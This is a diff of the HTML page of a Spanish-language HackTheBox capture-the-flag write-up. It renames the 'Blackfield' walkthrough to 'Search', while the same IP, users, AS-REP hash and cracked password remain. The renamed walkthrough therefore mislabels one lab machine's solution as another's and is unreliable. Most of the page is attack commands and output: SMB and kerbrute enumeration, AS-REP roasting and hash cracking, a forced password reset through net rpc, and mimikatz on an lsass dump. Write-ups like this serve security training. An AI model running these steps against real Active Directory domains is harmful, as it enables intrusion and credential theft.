@@ -6,9 +6,9 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="robots" content="noindex">
 
-  <title>Writeup HackTheBox Blackfield</title>
+  <title>Writeup HackTheBox Search</title>
 
-  <meta name="description" content="Resolución de la máquina Blackfield de la plataforma de HackTheBox">
+  <meta name="description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
   <meta name="author" content="GatoGamer1155">
   <meta name="HandheldFriendly" content="True">
   <meta name="MobileOptimized" content="320">
@@ -16,19 +16,19 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Writeup HackTheBox Blackfield">
-  <meta name="twitter:description" content="Resolución de la máquina Blackfield de la plataforma de HackTheBox">
+  <meta name="twitter:title" content="Writeup HackTheBox Search">
+  <meta name="twitter:description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
   <meta name="twitter:creator" content="GatoGamer1155">  
-  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/blackfield.png" />
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" />
 
   <meta property="og:site_name" content="GatoGamer1155" />
   <meta property="og:type" content="article">
-  <meta property="og:title" content="Writeup HackTheBox Blackfield">
-  <meta property="og:description" content="Resolución de la máquina Blackfield de la plataforma de HackTheBox">
-  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/blackfield.png" />
+  <meta property="og:title" content="Writeup HackTheBox Search">
+  <meta property="og:description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" />
 
   <link rel="manifest" href="/images/favicons/manifest.json">
-  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/blackfield.png">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png">
 
   <meta name="msapplication-TileColor" content="#ffc40d">
   <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
@@ -39,7 +39,7 @@
   <meta name="theme-color" content="#ffffff">
 
   <link rel="stylesheet" href="/css/main.css?1678854914750547280">
-  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Blackfield" href="/feed.xml">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Search" href="/feed.xml">
 </head>
 
   <body style="background-color: #282828;">
@@ -124,7 +124,6 @@
       <h3 class="post-title">Contenido</h3><br>
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
-        <li><a href="#access-support">Access - support</a></li>
         <li><a href="#access-audit2020">Access - audit2020</a></li>
         <li><a href="#shell-svc_backup">Shell - svc_backup</a></li>
         <li><a href="#shell-administrator">Shell - Administrator</a></li>
@@ -134,8 +133,8 @@
 
   <header class="post-header slide-top">
     <h4 class="post-title">HackTheBox</h4>
-    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/blackfield.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
-    <h2 class="post-title">Blackfield</h2><br>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Search</h2><br>
   </header>
   
 <section class="post" id="enumeration">
@@ -156,37 +155,37 @@ PORT     STATE SERVICE
 5985/tcp open  wsman</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">blackfield.local</code> ademas del nombre que parece es <code class="language-plaintext highlighter-rouge">DC01</code></p>
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">search.local</code> ademas del nombre que parece es <code class="language-plaintext highlighter-rouge">DC01</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.192
-</span><span class="az">SMB         </span><span class="p">10.10.10.192     445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  </span>
+</span><span class="az">SMB         </span><span class="p">10.10.10.192     445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">"10.10.10.192 blackfield.local dc01.blackfield.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.192 search.local dc01.search.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Enumerando los recursos compartidos a nivel de <code class="language-plaintext highlighter-rouge">SMB</code> como el usuario <code class="language-plaintext highlighter-rouge">null</code> sin contraseña vemos que tenemos privilegio de lectura al recurso <code class="language-plaintext highlighter-rouge">profiles$</code><p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u null -p </span><span class="am">''</span><span class="p"> --shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\null: 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">Share           Permissions     Remark
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">-----           -----------     ------
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">C$                              Default share
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">forensic                        Forensic / Audit share.
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">NETLOGON                        Logon server share 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">profiles$       READ            
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">SYSVOL                          Logon server share</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u null -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\null: 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">forensic                        Forensic / Audit share.
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">NETLOGON                        Logon server share 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">profiles$       READ            
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">SYSVOL                          Logon server share</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al conectarnos al recurso <code class="language-plaintext highlighter-rouge">profiles$</code> con <code class="language-plaintext highlighter-rouge">smbclient</code> como el usuario <code class="language-plaintext highlighter-rouge">null</code> sin contraseña nos encontramos con <code class="language-plaintext highlighter-rouge">carpetas</code> con nombres de posibles <code class="language-plaintext highlighter-rouge">usuarios</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbclient </span><span class="p">blackfield.local/null@dc01.blackfield.local -no-pass  
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.local/null@dc01.search.local -no-pass  
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Type help for list of commands
@@ -212,7 +211,7 @@ drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 AKollolli
 
 <p class="plain-text">Creamos un archivo llamado <code class="language-plaintext highlighter-rouge">users.txt</code> con el nombre de las <code class="language-plaintext highlighter-rouge">carpetas</code> y usando <code class="language-plaintext highlighter-rouge">kerbrute</code> enumeramos los usuarios validos en el <code class="language-plaintext highlighter-rouge">dominio</code>, encontramos <code class="language-plaintext highlighter-rouge">3</code> validos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d blackfield.local --dc dc01.blackfield.local users.txt  
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d search.local --dc dc01.search.local users.txt  
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -220,27 +219,27 @@ drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 AKollolli
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/ 
 
 >  Using KDC(s):
->  	dc01.blackfield.local:88
+>  	dc01.search.local:88
 </span><span class="ve">
->  [+] VALID USERNAME:	 audit2020@blackfield.local
->  [+] VALID USERNAME:	 support@blackfield.local
->  [+] VALID USERNAME:	 svc_backup@blackfield.local
+>  [+] VALID USERNAME:	 audit2020@search.local
+>  [+] VALID USERNAME:	 support@search.local
+>  [+] VALID USERNAME:	 svc_backup@search.local
 </span><span class="p">>  Done! Tested 314 usernames (3 valid) in 69.595 seconds</span>
 </code></pre></div></div><br>
 
 
 </section>
 
-<section class="post" id="access-support">
-<br><h3 class="post-title">Access - support</h3><br>
+<section class="post" id="access-audit2020">
+<br><h3 class="post-title">Access - audit2020</h3><br>
 
 <p class="plain-text">Nuestra lista de <code class="language-plaintext highlighter-rouge">usuarios</code> se disminuye a solo 3, al probar un ataque <code class="language-plaintext highlighter-rouge">ASREPRoast</code> con estos usuarios el usuario <code class="language-plaintext highlighter-rouge">support</code> es vulnerable y nos devuelve su <code class="language-plaintext highlighter-rouge">hash</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">blackfield.local/ -no-pass -usersfile users.txt
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">search.local/ -no-pass -usersfile users.txt
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$support@BLACKFIELD.LOCAL:31cc48516cee02ea98a1780c9bf418d2$d70ab79d141aa18456ad2583b8543b59101746b09d24b880912a5b7d77826c52191f18e4da324f9aaeac6844354f0bf0a742ebcece882906df64969eb81ad99e45e081f8139d66e106cfe39d98fe2dfe50661306236747e68405d3dc89a4f2ff325de3aa135208a92cbb998362c8f0eb8acd4b14a09cd0dcab789ec5971eca7656a05b8f6727dc42a7ddaa172a629a2de268ace291a795d72c4bdec0cb796a01a101f45c8379094e21af188fa526d35481df3e4e11564cbd0c9b8afe4428bb99e73c3f8b39dc7799386032a7584a06afff1f6eedc97eb035fc2605e70e76f67f07c7cc5b57182254e5f4578b2c79c2b370634493  
+$krb5asrep$23$support@search.LOCAL:31cc48516cee02ea98a1780c9bf418d2$d70ab79d141aa18456ad2583b8543b59101746b09d24b880912a5b7d77826c52191f18e4da324f9aaeac6844354f0bf0a742ebcece882906df64969eb81ad99e45e081f8139d66e106cfe39d98fe2dfe50661306236747e68405d3dc89a4f2ff325de3aa135208a92cbb998362c8f0eb8acd4b14a09cd0dcab789ec5971eca7656a05b8f6727dc42a7ddaa172a629a2de268ace291a795d72c4bdec0cb796a01a101f45c8379094e21af188fa526d35481df3e4e11564cbd0c9b8afe4428bb99e73c3f8b39dc7799386032a7584a06afff1f6eedc97eb035fc2605e70e76f67f07c7cc5b57182254e5f4578b2c79c2b370634493  
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
 </code></pre></div></div><br>
 
@@ -250,48 +249,43 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:31cc48516cee02ea98a1780c9bf418d2$d70ab79d
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
 Press 'q' or Ctrl-C to abort, almost any other key for status
-</span><span class="am">#00^BlackKnight</span><span class="p">  (</span><span class="am">$krb5asrep$23$support@BLACKFIELD.LOCAL</span><span class="p">)
+</span><span class="am">#00^BlackKnight</span><span class="p">  (</span><span class="am">$krb5asrep$23$support@search.LOCAL</span><span class="p">)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> las credenciales y son validas sin embargo realmente no nos aporta nuevos <code class="language-plaintext highlighter-rouge">privilegios</code> sobre los recursos smb compartidos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p">
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\support:#00^BlackKnight 
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\support:#00^BlackKnight 
 
-</span><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p"> --shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\support:#00^BlackKnight 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">Share           Permissions     Remark
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">-----           -----------     ------
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">C$                              Default share
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">forensic                        Forensic / Audit share.
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">NETLOGON        READ            Logon server share 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">profiles$       READ            
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">SYSVOL          READ            Logon server share</span>
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\support:#00^BlackKnight 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">forensic                        Forensic / Audit share.
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">profiles$       READ            
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">SYSVOL          READ            Logon server share</span>
 </code></pre></div></div><br>
-
-</section>
-
-<section class="post" id="access-audit2020">
-<br><h3 class="post-title">Access - audit2020</h3><br>
 
 <p class="plain-text">Podemos <code class="language-plaintext highlighter-rouge">bloodhound</code> para recolectar toda la información del <code class="language-plaintext highlighter-rouge">dominio</code>, para esto usaremos las credenciales del usuario <code class="language-plaintext highlighter-rouge">support</code> y crear un archivo <code class="language-plaintext highlighter-rouge">zip</code> con ella</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p"> -c All -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip  
-INFO: Found AD domain: blackfield.local
+<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u support -p </span><span class="am">'#00^BlackKnight'</span><span class="p"> -c All -d search.local -dc dc01.search.local -ns 10.10.10.192 --zip  
+INFO: Found AD domain: search.local
 INFO: Getting TGT for user
-INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Connecting to LDAP server: dc01.search.local
 INFO: Kerberos auth to LDAP failed, trying NTLM
 INFO: Found 1 domains
 INFO: Found 1 domains in the forest
 INFO: Found 18 computers
-INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Connecting to LDAP server: dc01.search.local
 INFO: Kerberos auth to LDAP failed, trying NTLM
 INFO: Found 316 users
 INFO: Found 52 groups
@@ -300,25 +294,25 @@ INFO: Found 1 ous
 INFO: Found 19 containers
 INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: DC01.BLACKFIELD.local
+INFO: Querying computer: DC01.search.local
 INFO: Done in 00M 34S
 INFO: Compressing output into 20230625195626_bloodhound.zip</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Subimos el <code class="language-plaintext highlighter-rouge">zip</code> y entre los controles de objetos que tiene el usuario <code class="language-plaintext highlighter-rouge">support</code> nos encontramos con el privilegio <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> sobre el usuario <code class="language-plaintext highlighter-rouge">audit2020</code></p>
-<a href="/htb/blackfield/1.png" target="_blank"><div><p><img src="/htb/blackfield/1.png"></p></div></a>
+<a href="/htb/search/1.png" target="_blank"><div><p><img src="/htb/search/1.png"></p></div></a>
 
 <p class="plain-text">Este privilegio nos permite cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> de un usuario, asi que usando <code class="language-plaintext highlighter-rouge">net</code> mediante <code class="language-plaintext highlighter-rouge">rpc</code> cambiamos la contraseña del usuario <code class="language-plaintext highlighter-rouge">audit2020</code> por otra</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ net </span><span class="p">rpc password audit2020 -U </span><span class="am">'blackfield.local/support%#00^BlackKnight'</span><span class="p"> -S dc01.blackfield.local  
+<code><span class="ve">❯ net </span><span class="p">rpc password audit2020 -U </span><span class="am">'search.local/support%#00^BlackKnight'</span><span class="p"> -S dc01.search.local  
 Enter new password for audit2020: password123#</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ahora podemos comprobar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> que se ha cambiado la contraseña</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u audit2020 -p password123#
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\audit2020:password123#</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u audit2020 -p password123#
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\audit2020:password123#</span>
 </code></pre></div></div><br>
 
 </section>
@@ -328,24 +322,24 @@ Enter new password for audit2020: password123#</span>
 
 <p class="plain-text">Al listar los recursos compartidos como el usuario <code class="language-plaintext highlighter-rouge">audit2020</code> ahora tenemos nuevos privilegios, como el de lectura sobre el recurso <code class="language-plaintext highlighter-rouge">forensic</code> que antes no teniamos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u audit2020 -p password123# --shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\audit2020:password123# 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">Share           Permissions     Remark
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">-----           -----------     ------
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">C$                              Default share
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">forensic        READ            Forensic / Audit share.
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">NETLOGON        READ            Logon server share 
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">profiles$       READ            
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="am">SYSVOL          READ            Logon server share</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u audit2020 -p password123# --shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\audit2020:password123# 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">forensic        READ            Forensic / Audit share.
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">profiles$       READ            
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="am">SYSVOL          READ            Logon server share</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">smbclient</code> con las credenciales de <code class="language-plaintext highlighter-rouge">audit2020</code>, en el recurso <code class="language-plaintext highlighter-rouge">forensic</code> encontramos 3 <code class="language-plaintext highlighter-rouge">directorios</code> con archivos dentro de cada uno de ellos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbclient </span><span class="p">blackfield.local/audit2020:password123#@dc01.blackfield.local  
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.local/audit2020:password123#@dc01.search.local  
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Type help for list of commands
@@ -361,7 +355,7 @@ drw-rw-rw-          0  Fri Feb 28 17:30:34 2020 tools
 
 <p class="plain-text">Para facilitar el analisis haremos una <code class="language-plaintext highlighter-rouge">montura</code> en el directorio <code class="language-plaintext highlighter-rouge">/mnt</code> de todos los archivos del recurso <code class="language-plaintext highlighter-rouge">forencic</code>, estro proporcionando las credenciales de audit2020</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ sudo mount</span><span class="p"> -t cifs //blackfield.local/forensic /mnt -o username=audit2020,password=password123#,domain=blackfield.local  </span>
+<code><span class="ve">❯ sudo mount</span><span class="p"> -t cifs //search.local/forensic /mnt -o username=audit2020,password=password123#,domain=search.local  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/mnt</code> podemos listar todos los archivos del recurso <code class="language-plaintext highlighter-rouge">forensic</code>, encontramos archivos <code class="language-plaintext highlighter-rouge">txt</code>, <code class="language-plaintext highlighter-rouge">zip</code> y algunas <code class="language-plaintext highlighter-rouge">carpetas</code> con diferentes herramientas</p>
@@ -422,7 +416,7 @@ The command completed successfully.</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbclient </span><span class="p">blackfield.local/audit2020:password123#@dc01.blackfield.local  
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.local/audit2020:password123#@dc01.search.local  
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Type help for list of commands
@@ -440,7 +434,7 @@ Archive:  lsass.zip
 </code></pre></div></div><br>
 
 <p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">mimikatz</code> en Windows para dumpear logonPasswords del minidump</p>
-<a href="/htb/blackfield/3.png" target="_blank"><div><p><img src="/htb/blackfield/3.png"></p></div></a>
+<a href="/htb/search/3.png" target="_blank"><div><p><img src="/htb/search/3.png"></p></div></a>
 
